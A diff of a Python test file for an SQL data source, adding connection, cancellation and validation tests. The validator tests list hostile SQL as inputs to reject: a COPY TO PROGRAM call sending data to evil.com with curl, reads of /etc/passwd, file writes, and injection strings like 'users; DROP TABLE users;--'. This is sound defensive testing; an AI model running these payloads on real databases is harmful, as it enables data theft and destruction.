@@ -1,6 +1,11 @@
+import threading
+import time
+
 import polars as pl
 import pytest
 from sqlalchemy import create_engine
+
+from shared.db_reader import DatabaseReadCancelledError
 
 from flowfile_core.database.connection import get_db_context
 from flowfile_core.flowfile.database_connection_manager.db_connections import (
@@ -11,10 +16,12 @@ from flowfile_core.flowfile.flow_data_engine.flow_file_column.main import Flowfi
 from flowfile_core.flowfile.sources.external_sources.sql_source.sql_source import (
     SqlSource,
     UnsafeSQLError,
+    _resolve_connection_string,
     create_sql_source_from_db_settings,
     get_polars_type,
     get_query_columns,
     get_table_column_types,
+    validate_sql_identifier,
     validate_sql_query,
 )
 from flowfile_core.schemas.input_schema import (
@@ -29,18 +36,20 @@ try:
 except ModuleNotFoundError:
     import os
     import sys
+
     sys.path.append(os.path.dirname(os.path.abspath("flowfile_core/tests/flowfile_core_test_utils.py")))
     # noinspection PyUnresolvedReferences
     from flowfile_core_test_utils import ensure_password_is_available, is_docker_available
 
 
-
 @pytest.fixture
 def expected_schema() -> list[FlowfileColumn]:
-    minimal_schema = [MinimalFieldInfo(name='movie_id', data_type='Int64'),
-                      MinimalFieldInfo(name='title', data_type='String'),
-                      MinimalFieldInfo(name='cast', data_type='String'),
-                      MinimalFieldInfo(name='crew', data_type='String')]
+    minimal_schema = [
+        MinimalFieldInfo(name="movie_id", data_type="Int64"),
+        MinimalFieldInfo(name="title", data_type="String"),
+        MinimalFieldInfo(name="cast", data_type="String"),
+        MinimalFieldInfo(name="crew", data_type="String"),
+    ]
     return [FlowfileColumn.create_from_minimal_field_info(field) for field in minimal_schema]
 
 
@@ -51,36 +60,39 @@ def engine():
 
 @pytest.fixture
 def sql_source():
-    return SqlSource(connection_string="postgresql://testuser:testpass@localhost:5433/testdb",
-                     table_name='credits')
+    return SqlSource(connection_string="postgresql://testuser:testpass@localhost:5433/testdb", table_name="credits")
 
 
 @pytest.mark.skipif(not is_docker_available(), reason="Docker is not available or not running")
 def test_sql_source_with_table_and_schema(expected_schema):
-    sql_source = SqlSource(connection_string="postgresql://testuser:testpass@localhost:5433/testdb",
-                           table_name='credits',
-                           schema_name='public')
+    sql_source = SqlSource(
+        connection_string="postgresql://testuser:testpass@localhost:5433/testdb",
+        table_name="credits",
+        schema_name="public",
+    )
     assert sql_source.get_schema() == expected_schema, "Schema does not match expected schema"
 
 
 @pytest.mark.skipif(not is_docker_available(), reason="Docker is not available or not running")
 def test_sql_source_with_table_and_no_schema(expected_schema):
-    sql_source = SqlSource(connection_string="postgresql://testuser:testpass@localhost:5433/testdb",
-                           table_name='public.credits')
+    sql_source = SqlSource(
+        connection_string="postgresql://testuser:testpass@localhost:5433/testdb", table_name="public.credits"
+    )
     assert sql_source.get_schema() == expected_schema, "Schema does not match expected schema"
 
 
 @pytest.mark.skipif(not is_docker_available(), reason="Docker is not available or not running")
 def test_sql_source_with_query(expected_schema):
-    sql_source = SqlSource(connection_string="postgresql://testuser:testpass@localhost:5433/testdb",
-                           query="SELECT * FROM credits")
-    expected_columns = ['movie_id', 'title', 'cast', 'crew']
+    sql_source = SqlSource(
+        connection_string="postgresql://testuser:testpass@localhost:5433/testdb", query="SELECT * FROM credits"
+    )
+    expected_columns = ["movie_id", "title", "cast", "crew"]
     assert [s.column_name for s in sql_source.get_schema()] == expected_columns, "Schema does not match expected schema"
 
 
 @pytest.mark.skipif(not is_docker_available(), reason="Docker is not available or not running")
 def test_get_query_columns(engine):
-    expected_columns = ['movie_id', 'title', 'cast', 'crew']
+    expected_columns = ["movie_id", "title", "cast", "crew"]
 
     result_columns = get_query_columns(engine, query_text="SELECT * FROM credits")
     assert result_columns == expected_columns, "Query columns do not match expected columns"
@@ -90,13 +102,14 @@ def test_get_query_columns(engine):
 def test_get_table_column_types(engine):
     from sqlalchemy.dialects.postgresql import JSONB
     from sqlalchemy.sql.sqltypes import INTEGER, TEXT, Text
+
     expected = [
-        ('movie_id', INTEGER()),
-        ('title', TEXT()),
-        ('cast', JSONB(astext_type=Text())),
-        ('crew', JSONB(astext_type=Text()))  # Assuming the fourth column is named 'crew'
+        ("movie_id", INTEGER()),
+        ("title", TEXT()),
+        ("cast", JSONB(astext_type=Text())),
+        ("crew", JSONB(astext_type=Text())),  # Assuming the fourth column is named 'crew'
     ]
-    result = get_table_column_types(engine, table_name='credits')
+    result = get_table_column_types(engine, table_name="credits")
     assert str(result) == str(expected), "Table column types do not match expected types"
 
 
@@ -106,7 +119,6 @@ def test_get_pl_df(sql_source):
     df = sql_source.get_pl_df()
     assert isinstance(df, pl.DataFrame), "get_pl_df should return a polars DataFrame"
 
-    # Test caching
     cached_df = sql_source.read_result
     assert cached_df is not None, "The result should be cached in read_result"
     assert cached_df is df, "Cached DataFrame should be the same object as returned DataFrame"
@@ -115,15 +127,13 @@ def test_get_pl_df(sql_source):
 @pytest.mark.skipif(not is_docker_available(), reason="Docker is not available or not running")
 def test_get_df(sql_source, monkeypatch):
     """Test that get_df converts polars DataFrame to pandas DataFrame."""
-    # Mock the get_pl_df method
-    mock_pl_df = pl.DataFrame({'col1': [1, 2, 3]})
-    monkeypatch.setattr(sql_source, 'get_pl_df', lambda: mock_pl_df)
+    mock_pl_df = pl.DataFrame({"col1": [1, 2, 3]})
+    monkeypatch.setattr(sql_source, "get_pl_df", lambda: mock_pl_df)
 
-    # Call get_df
     result = sql_source.get_df()
 
-    # Check it's a pandas DataFrame
     import pandas as pd
+
     assert isinstance(result, pd.DataFrame), "get_df should return a pandas DataFrame"
     assert len(result) == 3, "DataFrame should have the correct number of rows"
 
@@ -131,37 +141,29 @@ def test_get_df(sql_source, monkeypatch):
 @pytest.mark.skipif(not is_docker_available(), reason="Docker is not available or not running")
 def test_data_getter(sql_source, monkeypatch):
     """Test that data_getter yields dictionaries from the DataFrame."""
-    # Mock the get_pl_df method
-    mock_pl_df = pl.DataFrame({'col1': [1, 2], 'col2': ['a', 'b']})
-    monkeypatch.setattr(sql_source, 'get_pl_df', lambda: mock_pl_df)
+    mock_pl_df = pl.DataFrame({"col1": [1, 2], "col2": ["a", "b"]})
+    monkeypatch.setattr(sql_source, "get_pl_df", lambda: mock_pl_df)
 
-    # Get results from data_getter
     results = list(sql_source.data_getter())
 
-    # Check the results
     assert len(results) == 2, "Should have 2 rows of data"
-    assert results[0] == {'col1': 1, 'col2': 'a'}, "First row should match expected values"
-    assert results[1] == {'col1': 2, 'col2': 'b'}, "Second row should match expected values"
+    assert results[0] == {"col1": 1, "col2": "a"}, "First row should match expected values"
+    assert results[1] == {"col1": 2, "col2": "b"}, "Second row should match expected values"
 
 
 @pytest.mark.skipif(not is_docker_available(), reason="Docker is not available or not running")
 def test_get_sample_with_table(monkeypatch):
     """Test get_sample with table mode."""
-    # Create SqlSource with table mode
     sql_source = SqlSource(
-        connection_string="postgresql://testuser:testpass@localhost:5433/testdb",
-        table_name='credits'
+        connection_string="postgresql://testuser:testpass@localhost:5433/testdb", table_name="credits"
     )
 
-    # Mock pl.read_database_uri
-    expected_data = [{'col1': 1, 'col2': 'a'}, {'col1': 2, 'col2': 'b'}]
+    expected_data = [{"col1": 1, "col2": "a"}, {"col1": 2, "col2": "b"}]
     mock_df = pl.DataFrame(expected_data)
-    monkeypatch.setattr(pl, 'read_database_uri', lambda query, conn: mock_df)
+    monkeypatch.setattr(pl, "read_database_uri", lambda query, conn: mock_df)
 
-    # Get samples
     samples = list(sql_source.get_sample(n=10))
 
-    # Check results
     assert len(samples) == 2, "Should return all rows in the sample DataFrame"
     assert samples == expected_data, "Sample data should match expected data"
 
@@ -169,21 +171,17 @@ def test_get_sample_with_table(monkeypatch):
 @pytest.mark.skipif(not is_docker_available(), reason="Docker is not available or not running")
 def test_get_sample_with_query(monkeypatch):
     """Test get_sample with query mode."""
-    # Create SqlSource with query mode
     sql_source = SqlSource(
-        connection_string="postgresql://testuser:testpass@localhost:5433/testdb",
-        query="SELECT * FROM credits"
+        connection_string="postgresql://testuser:testpass@localhost:5433/testdb", query="SELECT * FROM credits"
     )
 
-    mock_df = pl.DataFrame({'col1': [1, 2, 3, 4, 5], 'col2': ['a', 'b', 'c', 'd', 'e']})
-    monkeypatch.setattr(sql_source, 'get_pl_df', lambda: mock_df)
+    mock_df = pl.DataFrame({"col1": [1, 2, 3, 4, 5], "col2": ["a", "b", "c", "d", "e"]})
+    monkeypatch.setattr(sql_source, "get_pl_df", lambda: mock_df)
 
-    # Get samples with n=3
     samples = list(sql_source.get_sample(n=3))
 
-    # Check results
     assert len(samples) == 3, "Should return n rows in the sample"
-    assert samples[0] == {'col1': 1, 'col2': 'a'}, "First sample should match expected data"
+    assert samples[0] == {"col1": 1, "col2": "a"}, "First sample should match expected data"
 
 
 @pytest.mark.skipif(not is_docker_available(), reason="Docker is not available or not running")
@@ -196,14 +194,11 @@ def test_get_initial_data(sql_source):
 @pytest.mark.skipif(not is_docker_available(), reason="Docker is not available or not running")
 def test_get_iter(sql_source, monkeypatch):
     """Test that get_iter yields data from data_getter."""
-    # Mock data_getter
-    expected_data = [{'col1': 1}, {'col1': 2}]
-    monkeypatch.setattr(sql_source, 'data_getter', lambda: (item for item in expected_data))
+    expected_data = [{"col1": 1}, {"col1": 2}]
+    monkeypatch.setattr(sql_source, "data_getter", lambda: (item for item in expected_data))
 
-    # Get results from get_iter
     results = list(sql_source.get_iter())
 
-    # Check results
     assert results == expected_data, "get_iter should yield data from data_getter"
 
 
@@ -220,7 +215,7 @@ def test_invalid_initialization():
         SqlSource(
             connection_string="postgresql://testuser:testpass@localhost:5433/testdb",
             query="SELECT * FROM credits",
-            table_name="credits"
+            table_name="credits",
         )
     assert "Only one of table_name or query can be provided" in str(exc_info.value)
 
@@ -247,7 +242,7 @@ def test_parse_table_name():
 @pytest.mark.skipif(not is_docker_available(), reason="Docker is not available or not running")
 def test_parse_schema(sql_source, expected_schema, monkeypatch):
     """Test that parse_schema calls get_flow_file_columns."""
-    monkeypatch.setattr(sql_source, 'get_flow_file_columns', lambda: expected_schema)
+    monkeypatch.setattr(sql_source, "get_flow_file_columns", lambda: expected_schema)
     result = sql_source.parse_schema()
     assert result == expected_schema, "parse_schema should return result from get_flow_file_columns"
 
@@ -258,32 +253,27 @@ def test_get_polars_type():
     import polars as pl
     from sqlalchemy.sql.sqltypes import BOOLEAN, DATE, DATETIME, FLOAT, INTEGER, VARCHAR
 
-    # Test INTEGER type
     int_type = get_polars_type(INTEGER())
     assert isinstance(int_type(), pl.Int64), "INTEGER should convert to polars Int64"
 
-    # Test FLOAT type
     float_type = get_polars_type(FLOAT())
     assert isinstance(float_type(), pl.Float64), "FLOAT should convert to polars Float64"
 
-    # Test VARCHAR type
     string_type = get_polars_type(VARCHAR())
     assert isinstance(string_type(), pl.String), "VARCHAR should convert to polars String"
 
-    # Test BOOLEAN type
     bool_type = get_polars_type(BOOLEAN())
     assert isinstance(bool_type(), pl.Boolean), "BOOLEAN should convert to polars Boolean"
 
-    # Test DATE type
     date_type = get_polars_type(DATE())
     assert isinstance(date_type(), pl.Date), "DATE should convert to polars Date"
 
-    # Test DATETIME type
     datetime_type = get_polars_type(DATETIME())
     assert isinstance(datetime_type(), pl.Datetime), "DATETIME should convert to polars Datetime"
 
     # Test unknown type (should default to String)
     from sqlalchemy.sql.sqltypes import Enum
+
     unknown_type = get_polars_type(Enum("A", "B"))
     assert isinstance(unknown_type(), pl.String), "Unknown type should convert to polars String"
 
@@ -291,17 +281,17 @@ def test_get_polars_type():
 @pytest.mark.skipif(not is_docker_available(), reason="Docker is not available or not running")
 def test_create_sql_source_from_db_settings_connection():
     """Test the create_sql_source_from_db_settings function."""
-    # Mock the settings
-
-    database_connection = DatabaseConnection(database_type='postgresql',
-                                             username='testuser',
-                                             password_ref='test_database_pw',
-                                             host='localhost',
-                                             port=5433,
-                                             database='testdb')
-    database_settings = DatabaseSettings(database_connection=database_connection,
-                                         schema_name='public', table_name='movies',
-                                         connection_mode='inline')
+    database_connection = DatabaseConnection(
+        database_type="postgresql",
+        username="testuser",
+        password_ref="test_database_pw",
+        host="localhost",
+        port=5433,
+        database="testdb",
+    )
+    database_settings = DatabaseSettings(
+        database_connection=database_connection, schema_name="public", table_name="movies", connection_mode="inline"
+    )
     ensure_password_is_available()
     sql_source = create_sql_source_from_db_settings(database_settings, user_id=1)
     assert isinstance(sql_source, SqlSource), "Should create an instance of SqlSource"
@@ -315,19 +305,23 @@ def test_create_sql_source_from_db_settings_connection():
 @pytest.mark.skipif(not is_docker_available(), reason="Docker is not available or not running")
 def test_create_sql_source_from_db_settings_connection_reference():
     """Test the create_sql_source_from_db_settings function."""
-    # Mock the settings
-    database_connection = FullDatabaseConnection(database_type='postgresql',
-                                                 username='testuser',
-                                                 host='localhost',
-                                                 port=5433,
-                                                 database='testdb',
-                                                 password='testpass',
-                                                 connection_name="database_test_connection")
+    database_connection = FullDatabaseConnection(
+        database_type="postgresql",
+        username="testuser",
+        host="localhost",
+        port=5433,
+        database="testdb",
+        password="testpass",
+        connection_name="database_test_connection",
+    )
 
-    database_settings = DatabaseSettings(database_connection_name='database_test_connection',
-                                                      schema_name='public', table_name='movies',
-                                                      connection_mode='reference')
-    db_connection = get_local_database_connection('database_test_connection', 1)
+    database_settings = DatabaseSettings(
+        database_connection_name="database_test_connection",
+        schema_name="public",
+        table_name="movies",
+        connection_mode="reference",
+    )
+    db_connection = get_local_database_connection("database_test_connection", 1)
     if db_connection is None:
         with get_db_context() as db:
             store_database_connection(db, connection=database_connection, user_id=1)
@@ -341,17 +335,93 @@ def test_create_sql_source_from_db_settings_connection_reference():
         raise AssertionError(f"Validation failed: {e}")
 
 
+def test_resolve_connection_string_ssl_reference():
+    database_connection = FullDatabaseConnection(
+        database_type="postgresql",
+        username="testuser",
+        host="localhost",
+        port=5433,
+        database="testdb",
+        password="testpass",
+        connection_name="ssl_test_connection",
+        ssl_enabled=True,
+    )
+    if get_local_database_connection("ssl_test_connection", 1) is None:
+        with get_db_context() as db:
+            store_database_connection(db, connection=database_connection, user_id=1)
+
+    database_settings = DatabaseSettings(
+        database_connection_name="ssl_test_connection",
+        schema_name="public",
+        table_name="movies",
+        connection_mode="reference",
+    )
+    uri = _resolve_connection_string(database_settings, user_id=1)
+    assert "sslmode=require" in uri
+    assert "connect_timeout=10" in uri
+    assert uri.count("?") == 1
+
+
+def test_resolve_connection_string_inline_no_ssl():
+    ensure_password_is_available()
+    database_connection = DatabaseConnection(
+        database_type="postgresql",
+        username="testuser",
+        password_ref="test_database_pw",
+        host="localhost",
+        port=5433,
+        database="testdb",
+    )
+    database_settings = DatabaseSettings(
+        database_connection=database_connection, schema_name="public", table_name="movies", connection_mode="inline"
+    )
+    uri = _resolve_connection_string(database_settings, user_id=1)
+    assert "sslmode" not in uri
+    assert "connect_timeout=10" in uri
+
+
+def test_sql_source_get_pl_df_honors_cancel_check(monkeypatch):
+    """A hanging local read aborts promptly when the flow's cancel flag flips.
+
+    Covers the end-to-end wiring (SqlSource -> read_sql_with_fallback -> cancel_check)
+    that backs local-mode cancellation; no live database required.
+    """
+    from shared import db_reader
+
+    def hanging_read(query, uri):
+        time.sleep(20)
+        return pl.DataFrame()
+
+    monkeypatch.setattr(db_reader, "_read_connectorx", hanging_read)
+    monkeypatch.setattr(db_reader, "_read_sqlalchemy", hanging_read)
+
+    canceled = {"v": False}
+    source = SqlSource(
+        connection_string="postgresql://u@h/d",
+        query="SELECT 1",
+        cancel_check=lambda: canceled["v"],
+    )
+    threading.Timer(0.3, lambda: canceled.__setitem__("v", True)).start()
+
+    start = time.monotonic()
+    with pytest.raises(DatabaseReadCancelledError):
+        source.get_pl_df()
+    assert time.monotonic() - start < 5
+
+
 @pytest.mark.skipif(not is_docker_available(), reason="Docker is not available or not running")
 def test_error_sql_source_validate():
-    database_connection = DatabaseConnection(database_type='postgresql',
-                                             username='testuser',
-                                             password_ref='test_database_pw',
-                                             host='localhost',
-                                             port=5433,
-                                             database='testdb')
-    database_settings = DatabaseSettings(database_connection=database_connection,
-                                         schema_name='public', table_name='moviess',
-                                         connection_mode='inline')
+    database_connection = DatabaseConnection(
+        database_type="postgresql",
+        username="testuser",
+        password_ref="test_database_pw",
+        host="localhost",
+        port=5433,
+        database="testdb",
+    )
+    database_settings = DatabaseSettings(
+        database_connection=database_connection, schema_name="public", table_name="moviess", connection_mode="inline"
+    )
     ensure_password_is_available()
     sql_source = create_sql_source_from_db_settings(database_settings, user_id=1)
     assert isinstance(sql_source, SqlSource), "Should create an instance of SqlSource"
@@ -359,12 +429,9 @@ def test_error_sql_source_validate():
         sql_source.validate()
     error_message = str(excinfo.value)
     assert 'relation "public.moviess" does not exist' in error_message
-    assert 'SELECT * FROM public.moviess LIMIT 1' in error_message
 
 
-# ============================================================================
 # SQL Query Validation Tests (no Docker required)
-# ============================================================================
 
 
 class TestSQLQueryValidation:
@@ -416,7 +483,6 @@ class TestSQLQueryValidation:
         for query in dangerous_queries:
             with pytest.raises(UnsafeSQLError) as exc_info:
                 validate_sql_query(query)
-            # DROP statements don't start with SELECT, so they get caught by that check
             error_msg = str(exc_info.value)
             assert "DROP" in error_msg or "Only SELECT" in error_msg
 
@@ -430,7 +496,6 @@ class TestSQLQueryValidation:
         for query in dangerous_queries:
             with pytest.raises(UnsafeSQLError) as exc_info:
                 validate_sql_query(query)
-            # DELETE doesn't start with SELECT, so it gets caught as non-SELECT
             assert "Only SELECT queries are allowed" in str(exc_info.value)
 
     def test_update_statement_rejected(self):
@@ -443,7 +508,6 @@ class TestSQLQueryValidation:
         for query in dangerous_queries:
             with pytest.raises(UnsafeSQLError) as exc_info:
                 validate_sql_query(query)
-            # UPDATE doesn't start with SELECT
             assert "Only SELECT queries are allowed" in str(exc_info.value)
 
     def test_insert_statement_rejected(self):
@@ -456,7 +520,6 @@ class TestSQLQueryValidation:
         for query in dangerous_queries:
             with pytest.raises(UnsafeSQLError) as exc_info:
                 validate_sql_query(query)
-            # INSERT doesn't start with SELECT
             assert "Only SELECT queries are allowed" in str(exc_info.value)
 
     def test_create_statement_rejected(self):
@@ -470,7 +533,6 @@ class TestSQLQueryValidation:
         for query in dangerous_queries:
             with pytest.raises(UnsafeSQLError) as exc_info:
                 validate_sql_query(query)
-            # CREATE doesn't start with SELECT
             assert "Only SELECT queries are allowed" in str(exc_info.value)
 
     def test_alter_statement_rejected(self):
@@ -483,7 +545,6 @@ class TestSQLQueryValidation:
         for query in dangerous_queries:
             with pytest.raises(UnsafeSQLError) as exc_info:
                 validate_sql_query(query)
-            # ALTER doesn't start with SELECT
             assert "Only SELECT queries are allowed" in str(exc_info.value)
 
     def test_truncate_statement_rejected(self):
@@ -496,7 +557,6 @@ class TestSQLQueryValidation:
         for query in dangerous_queries:
             with pytest.raises(UnsafeSQLError) as exc_info:
                 validate_sql_query(query)
-            # TRUNCATE doesn't start with SELECT
             assert "Only SELECT queries are allowed" in str(exc_info.value)
 
     def test_grant_revoke_rejected(self):
@@ -516,8 +576,6 @@ class TestSQLQueryValidation:
         This is correct security behavior - dangerous SQL inside comments
         is not executed by the database, so we strip comments first.
         """
-        # These queries have dangerous SQL inside comments - after stripping,
-        # they become valid SELECT queries
         safe_after_stripping = [
             "SELECT * FROM users; -- DROP TABLE users",
             "SELECT * FROM users /* DROP TABLE users */",
@@ -528,7 +586,6 @@ class TestSQLQueryValidation:
 
     def test_dangerous_sql_outside_comments_blocked(self):
         """Test that dangerous SQL outside of comments is blocked."""
-        # This has DROP outside of any comment - should be caught
         with pytest.raises(UnsafeSQLError) as exc_info:
             validate_sql_query("SELECT * FROM users; DROP TABLE users")
         assert "DROP" in str(exc_info.value)
@@ -557,31 +614,242 @@ class TestSQLQueryValidation:
                 validate_sql_query(query)
             assert "Only SELECT queries are allowed" in str(exc_info.value)
 
+    def test_copy_rejected(self):
+        """Test that COPY statements (Postgres exfil via COPY TO PROGRAM) are blocked."""
+        dangerous_queries = [
+            "COPY (SELECT * FROM users) TO PROGRAM 'curl http://evil.com'",
+            "COPY users TO '/tmp/dump.csv'",
+            "SELECT 1; COPY users TO STDOUT",
+        ]
+        for query in dangerous_queries:
+            with pytest.raises(UnsafeSQLError):
+                validate_sql_query(query)
+
+    def test_merge_rejected(self):
+        """Test that MERGE statements are blocked."""
+        with pytest.raises(UnsafeSQLError) as exc_info:
+            validate_sql_query("MERGE INTO target USING source ON target.id = source.id")
+        assert "Only SELECT queries are allowed" in str(exc_info.value)
+
+    def test_into_outfile_rejected(self):
+        """Test that INTO OUTFILE (MySQL file write) is blocked."""
+        with pytest.raises(UnsafeSQLError) as exc_info:
+            validate_sql_query("SELECT * FROM users INTO OUTFILE '/tmp/data.csv'")
+        assert "INTO OUTFILE" in str(exc_info.value)
+
+    def test_load_data_rejected(self):
+        """Test that LOAD DATA (MySQL file read) is blocked."""
+        with pytest.raises(UnsafeSQLError) as exc_info:
+            validate_sql_query("LOAD DATA INFILE '/etc/passwd' INTO TABLE users")
+        assert "Only SELECT queries are allowed" in str(exc_info.value)
+
+    def test_pragma_rejected(self):
+        """Test that PRAGMA (SQLite config) is blocked."""
+        with pytest.raises(UnsafeSQLError) as exc_info:
+            validate_sql_query("PRAGMA table_info(users)")
+        assert "Only SELECT queries are allowed" in str(exc_info.value)
+
+    def test_attach_rejected(self):
+        """Test that ATTACH (SQLite DB attach) is blocked."""
+        with pytest.raises(UnsafeSQLError) as exc_info:
+            validate_sql_query("ATTACH DATABASE '/tmp/evil.db' AS evil")
+        assert "Only SELECT queries are allowed" in str(exc_info.value)
+
+    def test_detach_rejected(self):
+        """Test that DETACH (SQLite DB detach) is blocked."""
+        with pytest.raises(UnsafeSQLError) as exc_info:
+            validate_sql_query("DETACH DATABASE evil")
+        assert "Only SELECT queries are allowed" in str(exc_info.value)
+
+    def test_into_outfile_in_select_rejected(self):
+        """Test that INTO OUTFILE embedded in a SELECT is caught by dangerous_patterns."""
+        with pytest.raises(UnsafeSQLError) as exc_info:
+            validate_sql_query("SELECT * FROM users INTO OUTFILE '/tmp/out.csv'")
+        assert "INTO OUTFILE" in str(exc_info.value)
+
     def test_sql_source_rejects_unsafe_query(self):
         """Test that SqlSource constructor rejects unsafe queries."""
         with pytest.raises(UnsafeSQLError) as exc_info:
-            SqlSource(
-                connection_string="postgresql://test:test@localhost/test",
-                query="DROP TABLE users"
-            )
+            SqlSource(connection_string="postgresql://test:test@localhost/test", query="DROP TABLE users")
         assert "Only SELECT queries are allowed" in str(exc_info.value)
 
     def test_sql_source_accepts_safe_query(self):
         """Test that SqlSource constructor accepts safe SELECT queries."""
-        # This should not raise - it's a valid SELECT query
         sql_source = SqlSource(
-            connection_string="postgresql://test:test@localhost/test",
-            query="SELECT * FROM users WHERE id = 1"
+            connection_string="postgresql://test:test@localhost/test", query="SELECT * FROM users WHERE id = 1"
         )
         assert sql_source.query == "SELECT * FROM users WHERE id = 1"
         assert sql_source.query_mode == "query"
 
     def test_table_mode_bypasses_validation(self):
         """Test that table mode (auto-generated queries) bypasses validation."""
-        # Table mode generates its own SELECT query, so no user input validation needed
-        sql_source = SqlSource(
-            connection_string="postgresql://test:test@localhost/test",
-            table_name="users"
-        )
+        sql_source = SqlSource(connection_string="postgresql://test:test@localhost/test", table_name="users")
         assert sql_source.query_mode == "table"
         assert "SELECT * FROM users" in sql_source.query
+
+
+# SQL Identifier Validation Tests (no Docker required)
+
+
+class TestSQLIdentifierValidation:
+    """Tests for SQL identifier validation - these don't require a database connection."""
+
+    def test_valid_identifiers(self):
+        """Test that valid identifiers pass validation."""
+        valid_identifiers = [
+            "users",
+            "my_table",
+            "_private",
+            "Table1",
+            "a",
+            "_",
+            "UPPER_CASE",
+            "schema123",
+        ]
+        for identifier in valid_identifiers:
+            validate_sql_identifier(identifier)  # Should not raise
+
+    def test_valid_dotted_identifiers(self):
+        """Test that valid dotted identifiers (schema.table) pass validation."""
+        valid_identifiers = [
+            "public.users",
+            "my_schema.my_table",
+            "analytics.public.credits",
+        ]
+        for identifier in valid_identifiers:
+            validate_sql_identifier(identifier)  # Should not raise
+
+    def test_sql_injection_in_table_name_rejected(self):
+        """Test that SQL injection attempts in table names are rejected."""
+        malicious_names = [
+            "users; DROP TABLE users;--",
+            "users; DELETE FROM users",
+            "users UNION SELECT * FROM secrets",
+            "users' OR '1'='1",
+        ]
+        for name in malicious_names:
+            with pytest.raises(UnsafeSQLError):
+                validate_sql_identifier(name, "table name")
+
+    def test_sql_injection_in_schema_name_rejected(self):
+        """Test that SQL injection attempts in schema names are rejected."""
+        malicious_names = [
+            "public; DROP TABLE users;--",
+            "public' OR '1'='1",
+            "public; SELECT * FROM secrets",
+        ]
+        for name in malicious_names:
+            with pytest.raises(UnsafeSQLError):
+                validate_sql_identifier(name, "schema name")
+
+    def test_empty_identifier_rejected(self):
+        """Test that empty and whitespace-only identifiers are rejected."""
+        with pytest.raises(UnsafeSQLError) as exc_info:
+            validate_sql_identifier("", "table name")
+        assert "cannot be empty" in str(exc_info.value)
+
+        with pytest.raises(UnsafeSQLError) as exc_info:
+            validate_sql_identifier("   ", "table name")
+        assert "cannot be empty" in str(exc_info.value)
+
+    def test_special_characters_rejected(self):
+        """Test that special characters in identifiers are rejected."""
+        invalid_names = [
+            "table'name",
+            'table"name',
+            "table--name",
+            "table;name",
+            "table name",
+            "table(name)",
+            "table=name",
+            "1table",
+        ]
+        for name in invalid_names:
+            with pytest.raises(UnsafeSQLError):
+                validate_sql_identifier(name, "table name")
+
+    def test_sql_source_rejects_malicious_table_name(self):
+        """Test that SqlSource constructor rejects malicious table names."""
+        with pytest.raises(UnsafeSQLError):
+            SqlSource(
+                connection_string="postgresql://test:test@localhost/test", table_name="users; DROP TABLE users;--"
+            )
+
+    def test_sql_source_rejects_malicious_schema_name(self):
+        """Test that SqlSource constructor rejects malicious schema names."""
+        with pytest.raises(UnsafeSQLError):
+            SqlSource(
+                connection_string="postgresql://test:test@localhost/test",
+                table_name="users",
+                schema_name="public; DROP TABLE users;--",
+            )
+
+    def test_sql_source_accepts_valid_table_with_schema(self):
+        """Test that SqlSource accepts valid table and schema names."""
+        sql_source = SqlSource(
+            connection_string="postgresql://test:test@localhost/test", table_name="users", schema_name="public"
+        )
+        assert sql_source.query == "SELECT * FROM public.users"
+
+    def test_sql_source_accepts_dotted_table_name(self):
+        """Test that SqlSource accepts dotted table names (schema.table notation)."""
+        sql_source = SqlSource(connection_string="postgresql://test:test@localhost/test", table_name="public.users")
+        assert sql_source.query == "SELECT * FROM public.users"
+
+    def test_pydantic_database_settings_rejects_malicious_table(self):
+        """Test that DatabaseSettings Pydantic model rejects malicious table names."""
+        from pydantic import ValidationError
+
+        with pytest.raises(ValidationError):
+            DatabaseSettings(
+                table_name="users; DROP TABLE users;--",
+                query_mode="table",
+                connection_mode="inline",
+                database_connection=DatabaseConnection(
+                    database_type="postgresql",
+                    username="test",
+                    password_ref="test",
+                    host="localhost",
+                    port=5432,
+                    database="testdb",
+                ),
+            )
+
+    def test_pydantic_database_settings_rejects_malicious_schema(self):
+        """Test that DatabaseSettings Pydantic model rejects malicious schema names."""
+        from pydantic import ValidationError
+
+        with pytest.raises(ValidationError):
+            DatabaseSettings(
+                table_name="users",
+                schema_name="public; DROP TABLE users;--",
+                query_mode="table",
+                connection_mode="inline",
+                database_connection=DatabaseConnection(
+                    database_type="postgresql",
+                    username="test",
+                    password_ref="test",
+                    host="localhost",
+                    port=5432,
+                    database="testdb",
+                ),
+            )
+
+    def test_pydantic_database_settings_accepts_valid_identifiers(self):
+        """Test that DatabaseSettings accepts valid table and schema names."""
+        settings = DatabaseSettings(
+            table_name="users",
+            schema_name="public",
+            query_mode="table",
+            connection_mode="inline",
+            database_connection=DatabaseConnection(
+                database_type="postgresql",
+                username="test",
+                password_ref="test",
+                host="localhost",
+                port=5432,
+                database="testdb",
+            ),
+        )
+        assert settings.table_name == "users"
+        assert settings.schema_name == "public"
